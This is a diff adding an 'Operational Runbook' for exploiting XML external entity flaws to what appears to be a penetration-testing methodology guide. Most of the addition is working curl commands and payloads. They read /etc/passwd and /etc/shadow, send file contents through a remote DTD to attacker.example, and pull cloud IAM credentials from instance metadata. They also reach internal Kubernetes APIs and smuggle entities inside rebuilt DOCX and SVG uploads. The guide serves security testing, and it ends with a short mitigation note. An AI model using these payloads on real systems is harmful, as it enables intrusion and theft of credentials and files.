@@ -172,6 +172,133 @@ Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-styleshee
 - OOXML (docx/xlsx/pptx) are ZIPs containing XML
 - Insert payloads into document.xml, rels, or drawing XML and repackage
 
+## Operational Runbook
+
+Once a candidate XML-accepting endpoint is identified, this is the canonical XXE exploitation flow.
+
+### Step 1 — confirm XML parsing accepts DOCTYPE
+
+```bash
+# Baseline benign XML
+curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
+    -d '<?xml version="1.0"?><root>baseline</root>'
+
+# Add a DOCTYPE; if parser doesn't error → DTD processing enabled
+curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
+    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY bar "test">]><root>&bar;</root>'
+# If response echoes "test" → entity expansion works
+```
+
+### Step 2 — local file disclosure
+
+```bash
+# Classic: read /etc/passwd
+curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
+    --data-raw '<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>'
+
+# Read multi-line files that break XML parsers (binary, etc.)
+# via CDATA wrapping in parameter entities
+curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
+    --data-raw '<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % param1 "<!ENTITY exfil SYSTEM &#x27;file:///etc/shadow&#x27;>">
+  %param1;
+]>
+<root>&exfil;</root>'
+```
+
+### Step 3 — OOB exfiltration (parameter entities — for files that break inline XML)
+
+```bash
+# Host a malicious DTD on attacker server
+cat > /var/www/attacker/evil.dtd <<'EOF'
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.example/?d=%data;'>">
+%param;
+%exfil;
+EOF
+
+# Trigger the parser to fetch + execute the remote DTD
+curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
+    --data-raw '<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">%remote;]>
+<root/>'
+
+# /etc/passwd content arrives in the attacker's web log as a query string
+tail -f /var/log/nginx/access.log | grep attacker
+```
+
+### Step 4 — XXE → SSRF (cloud metadata)
+
+```bash
+# AWS IMDSv1 (no token required)
+curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
+    --data-raw '<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+<root>&xxe;</root>'
+
+# GCP metadata (requires Metadata-Flavor header — works only if XXE can issue headers; rare)
+# Internal services
+curl -sX POST '<TARGET>/api/xml' -H 'Content-Type: application/xml' \
+    --data-raw '<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.kube:8080/api/v1/namespaces">]>
+<root>&xxe;</root>'
+```
+
+### Step 5 — blind XXE via XInclude / XSLT
+
+When the response doesn't echo entity content, try alternate parsers:
+
+```xml
+<!-- XInclude (libxml2 with xinclude enabled) -->
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</root>
+
+<!-- XSLT — server-side stylesheet processing -->
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="http://attacker.example/x.xsl"?>
+<!-- where x.xsl uses document() or php:function for RCE -->
+```
+
+### Step 6 — non-XML content-type carriers (overlooked variants)
+
+XML parsers lurk in places you wouldn't expect — try these content types:
+
+```bash
+# SOAP endpoints
+curl -sX POST '<TARGET>/soap' -H 'Content-Type: text/xml; charset=utf-8' \
+    --data-raw '<?xml version="1.0"?>...XXE payload here...'
+
+# RSS / Atom feed ingest
+curl -sX POST '<TARGET>/feeds' -H 'Content-Type: application/rss+xml' \
+    --data-raw '...'
+
+# OOXML upload (DOCX = zip containing XML — repackage with XXE in document.xml)
+mkdir -p /tmp/xxe-docx; cd /tmp/xxe-docx
+unzip /tmp/clean.docx
+sed -i 's|<w:body>|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:body>\&xxe;|' word/document.xml
+zip -r /tmp/xxe.docx .
+curl -sF "file=@/tmp/xxe.docx" '<TARGET>/upload'
+
+# SAML — login endpoints accepting signed SAML assertions
+# (extract the SAMLResponse field from a valid POST, decode base64, modify, re-encode)
+
+# SVG upload — SVGs are XML
+echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>' > /tmp/xxe.svg
+curl -sF "file=@/tmp/xxe.svg" '<TARGET>/upload'
+```
+
+### Step 7 — capture evidence
+
+Document:
+- Confirmed XXE primitive (entity expansion succeeded)
+- Bytes exfiltrated (or OAST callback received)
+- Severity: **critical** if cloud-metadata creds extracted or SSH keys read; **high** otherwise.
+- Mitigation note: disable DOCTYPE processing (`XML_PARSE_NOENT=0` in libxml2; `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` in Java).
+
 ## Testing Methodology
 
 1. **Inventory consumers** - Endpoints, upload parsers, background jobs, CLI tools, converters, third-party SDKs
